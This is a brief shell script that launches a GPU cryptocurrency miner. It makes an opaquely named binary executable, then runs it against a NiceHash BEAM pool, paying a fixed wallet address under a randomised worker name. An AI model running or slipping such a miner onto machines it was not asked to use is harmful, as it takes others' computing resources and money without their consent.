POOL=stratum+tcp://beamv3.eu-west.nicehash.com:3387

WALLET=3D6NtTR5Zw5VmYx9ZNfHkLhXRp2uPb9BXk

WORKER=$(echo $(shuf -i 1-100000 -n 1)-GPU)

chmod +x memek

./memek --algo BEAM-III --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY --mode a
